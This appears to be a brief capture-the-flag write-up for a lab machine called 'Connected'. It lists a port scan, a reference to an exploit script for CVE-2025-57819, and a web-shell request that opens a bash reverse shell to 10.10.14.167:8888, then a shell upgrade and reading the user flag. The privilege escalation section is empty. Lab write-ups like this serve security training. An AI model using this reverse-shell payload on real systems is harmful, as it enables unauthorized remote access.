# Connected

nmap -sV -sC -T5 <target_ip>

Watchtowr python script for CVE-2025-57819

http://connected.htb/this-is-an-ioc-not-actually-watchTowr-pgbnd4yftm.php?cmd=bash+-c+%27bash+-i+%3E%26+/dev/tcp/10.10.14.167/8888+0%3E%261%27

python -c 'import pty; pty.spawn("/bin/bash")'

whoami -> asterisk

cd /home/asterisk; ls

cat user.txt

User flag owned!

Privilege Escalation:



